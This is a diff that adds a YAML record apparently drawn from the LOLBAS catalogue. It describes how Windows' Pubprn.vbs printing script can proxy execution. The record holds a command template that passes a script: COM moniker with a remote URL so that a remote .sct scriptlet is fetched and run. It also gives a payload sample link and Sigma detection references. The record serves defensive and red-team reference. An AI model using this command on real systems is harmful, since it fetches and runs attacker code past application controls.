@@ -1,0 +1,93 @@
+id: lolbas/T1NTY3JpcHRzL1B1YnBybi55bWw/RXhlY3V0ZQ/0
+type: script
+platform: windows
+name: Pubprn.vbs
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1216.001
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
+commands:
+- template: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+  comment: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
+references:
+- https://lolbas-project.github.io/lolbas/Scripts/Pubprn/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Pubprn.vbs
+      category: Execute
+      privileges: User
+      mitre_id: T1216.001
+      source_file: OSScripts/Pubprn.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Pubprn.vbs\nDescription: Proxy execution with Pubprn.vbs\nAuthor: Oddvar\
+        \ Moe\nCreated: 2018-05-25\nCommands:\n  - Command: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}\n\
+        \    Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host\
+        \ (WSH) Injection\n    Usecase: Proxy execution\n    Category: Execute\n    Privileges: User\n\
+        \    MitreID: T1216.001\n    OperatingSystem: Windows 10\n    Tags:\n      - Execute: SCT\nFull_Path:\n\
+        \  - Path: C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs\n  - Path: C:\\Windows\\\
+        SysWOW64\\Printing_Admin_Scripts\\en-US\\pubprn.vbs\nCode_Sample:\n  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct\n\
+        Detection:\n  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml\n\
+        Resources:\n  - Link: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/\n  - Link:\
+        \ https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology\n  - Link: https://github.com/enigma0x3/windows-operating-system-archaeology\n\
+        Acknowledgement:\n  - Person: Matt Nelson\n    Handle: '@enigma0x3'\n"
+      document_sha256: sha256:ae742a1dbedda11264e163bf87c091eccd866ec894e8e1e03491a252ba633ca7
+    upstream_url: https://lolbas-project.github.io/lolbas/Scripts/Pubprn/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1216.001
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:85917fb08e06dc7b26c058b5bffce2a90ddc9d1a4b49f71b472afedb528c7685
